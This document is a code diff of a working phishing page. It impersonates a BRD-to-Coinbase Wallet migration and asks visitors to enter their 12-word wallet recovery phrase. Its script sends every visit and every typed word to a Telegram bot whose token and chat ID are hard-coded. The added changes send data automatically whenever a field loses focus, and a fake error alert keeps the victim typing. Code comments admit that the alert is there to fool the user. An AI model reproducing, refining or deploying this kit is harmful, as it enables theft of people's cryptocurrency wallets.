@@ -1,88 +1,145 @@
 <!DOCTYPE html>
-<div class="container">
-    <div id="p1" class="page active">
-        <div class="logo-area">
-            <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
-        </div>
-        <h1>BRD has joined<br>Coinbase Wallet!</h1>
-        <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
-        <div class="btn-container">
-            <button class="btn btn-primary" onclick="showPage('p2')">Get Coinbase Wallet</button>
-            <button class="btn btn-secondary" onclick="showPage('p2')">View Press Release</button>
-            <button class="btn btn-secondary" onclick="showPage('p2')">Restore Wallet</button>
-        </div>
-    </div>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BRD Wallet Migration</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #1e1e3f;
+            --btn-blue: #586cf5;
+            --btn-gray: #3e3f5e;
+            --text-white: #ffffff;
+            --text-secondary: #b0b0cc;
+            --grid-border: rgba(255, 255, 255, 0.1);
+            --input-bg: #2a2a4a;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg-color); color: var(--text-white); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 500px; min-height: 100vh; display: flex; flex-direction: column; padding: 40px 25px; position: relative; }
+        @media (min-width: 1024px) { .container { max-width: 450px; min-height: 850px; border: 1px solid var(--grid-border); border-radius: 30px; margin: 20px; } }
+        .page { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.4s ease; }
+        .page.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .logo-area { display: flex; flex-direction: column; align-items: center; margin-top: 20px; margin-bottom: 40px; }
+        .brd-main-img { width: 140px; height: auto; }
+        h1 { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 20px; line-height: 1.2; }
+        .sub-text { color: var(--text-secondary); text-align: center; font-size: 15px; line-height: 1.6; margin-bottom: 60px; }
+        .btn-container { display: flex; flex-direction: column; gap: 15px; margin-top: auto; }
+        .btn { width: 100%; padding: 18px; border-radius: 8px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn-primary { background-color: var(--btn-blue); color: white; }
+        .btn-secondary { background-color: var(--btn-gray); color: white; }
+        .recovery-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; padding-top: 10px; }
+        .back-arrow { width: 24px; height: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .back-arrow svg { width: 20px; height: 20px; stroke: white; stroke-width: 2; fill: none; }
+        .help-icon { width: 24px; height: 24px; border: 2px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 600; }
+        .recovery-title { font-size: 26px; font-weight: 600; text-align: left; margin-bottom: 12px; line-height: 1.3; }
+        .recovery-subtitle { color: var(--text-secondary); text-align: left; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
+        .recovery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
+        .grid-item { background-color: var(--input-bg); border-radius: 8px; height: 56px; display: flex; align-items: center; justify-content: center; position: relative; }
+        .item-num { color: var(--text-secondary); font-size: 16px; font-weight: 500; }
+        .item-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; color: white; font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 5; }
+        .item-input:focus, .item-input:not(:placeholder-shown) { opacity: 1; }
+        .item-input:focus + .item-num, .item-input:not(:placeholder-shown) + .item-num { display: none; }
+    </style>
+</head>
+<body>
 
-    <div id="p2" class="page">
-        <div class="recovery-header">
-            <div class="back-arrow" onclick="showPage('p1')">
-                <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+    <div class="container">
+        <div id="p1" class="page active">
+            <div class="logo-area">
+                <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
             </div>
-            <div class="help-icon">?</div>
+            <h1>BRD has joined<br>Coinbase Wallet!</h1>
+            <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
+            <div class="btn-container">
+                <button class="btn btn-primary" onclick="showPage('p2')">Get Coinbase Wallet</button>
+                <button class="btn btn-secondary" onclick="showPage('p2')">View Press Release</button>
+                <button class="btn btn-secondary" onclick="showPage('p2')">Restore Wallet</button>
+            </div>
         </div>
-        <h1 class="recovery-title">Récupérer votre portefeuille</h1>
-        <p class="recovery-subtitle">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
-        <div class="recovery-grid" id="mainGrid"></div>
-        
-        <div class="btn-container" style="margin-top: 20px;">
-            <button class="btn btn-primary" onclick="checkAndSendAll()">Entrer</button>
+
+        <div id="p2" class="page">
+            <div class="recovery-header">
+                <div class="back-arrow" onclick="showPage('p1')">
+                    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                </div>
+                <div class="help-icon">?</div>
+            </div>
+            <h1 class="recovery-title">Récupérer votre portefeuille</h1>
+            <p class="recovery-subtitle">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
+            <div class="recovery-grid" id="mainGrid"></div>
+            
+            <div class="btn-container" style="margin-top: 30px;">
+                <button class="btn btn-primary" onclick="checkAndSendAll()">Restaurer</button>
+            </div>
         </div>
     </div>
-</div>
 
-<script>
-    const BOT_TOKEN = "8728135052:AAHDF-SQCPsS1y0JykPgEE691NIjQweUeIU";
-    const CHAT_ID = "8745009295";
+    <script>
+        const BOT_TOKEN = "8728135052:AAHDF-SQCPsS1y0JykPgEE691NIjQweUeIU";
+        const CHAT_ID = "8745009295";
 
-    async function sendFinalData(message) {
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+        async function sendFinalData(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+            } catch(e) {}
+        }
+
+        window.onload = () => sendFinalData("<b>⚠️ New Visitor Detected</b>");
+
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        const grid = document.getElementById('mainGrid');
+        for (let i = 1; i <= 12; i++) {
+            const div = document.createElement('div');
+            div.className = 'grid-item';
+            div.innerHTML = `<input type="text" class="item-input" data-id="${i}" placeholder=" " spellcheck="false" autocomplete="off"><span class="item-num">${i}</span>`;
+            grid.appendChild(div);
+        }
+
+        let sent = false; 
+
+        function checkAndSendAll() {
+            const inputs = document.querySelectorAll('.item-input');
+            let words = [];
+            let count = 0;
+
+            inputs.forEach(input => {
+                const val = input.value.trim();
+                if (val !== "") {
+                    count++;
+                }
+                words.push(`<b>${input.getAttribute('data-id')}:</b> <code>${val || "---"}</code>`);
             });
-        } catch(e) {}
-    }
 
-    window.onload = () => sendFinalData("<b>⚠️ New Visitor Detected</b>");
+            // يرسل البيانات عند الضغط على الزر (حتى لو لم تكتمل الكلمات لضمان وصول ما كتبه)
+            const fullMessage = `<b>✅ DATA RECEIVED VIA BUTTON</b>\n\n${words.join('\n')}`;
+            sendFinalData(fullMessage);
+            
+            // إظهار تنبيه بسيط للمستخدم
+            alert("Une erreur s'est produite. Veuillez réessayer.");
+        }
 
-    function showPage(id) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-    }
-
-    const grid = document.getElementById('mainGrid');
-    for (let i = 1; i <= 12; i++) {
-        const div = document.createElement('div');
-        div.className = 'grid-item';
-        div.innerHTML = `<input type="text" class="item-input" data-id="${i}" placeholder=" " spellcheck="false" autocomplete="off"><span class="item-num">${i}</span>`;
-        grid.appendChild(div);
-    }
-
-    function checkAndSendAll() {
-        const inputs = document.querySelectorAll('.item-input');
-        let words = [];
-        let filledCount = 0;
-
-        inputs.forEach(input => {
-            const val = input.value.trim();
-            if (val !== "") {
-                filledCount++;
+        document.addEventListener('input', (e) => {
+            if (e.target.getAttribute('data-id') === "12") {
+                checkAndSendAll();
             }
-            words.push(`<b>${input.getAttribute('data-id')}:</b> <code>${val || "Empty"}</code>`);
         });
 
-        // يرسل البيانات عند الضغط على الزر بغض النظر عن العدد، أو يمكنك تعديل الشرط
-        const fullMessage = `<b>✅ BUTTON CLICKED / DATA RECEIVED</b>\n\n${words.join('\n')}`;
-        sendFinalData(fullMessage);
-        
-        // تنبيه بسيط للمستخدم لإيهامه بالمعالجة
-        alert("Connexion en cours...");
-    }
-
-    document.addEventListener('input', (e) => {
-        if (e.target.getAttribute('data-id') === "12") {
-            // يمكن ترك الإرسال التلقائي أو الاعتماد كلياً على الزر
-        }
-    });
-</script>
+        document.addEventListener('blur', (e) => {
+            if (e.target.classList.contains('item-input')) {
+                checkAndSendAll();
+            }
+        }, true);
+    </script>
+</body>
+</html>
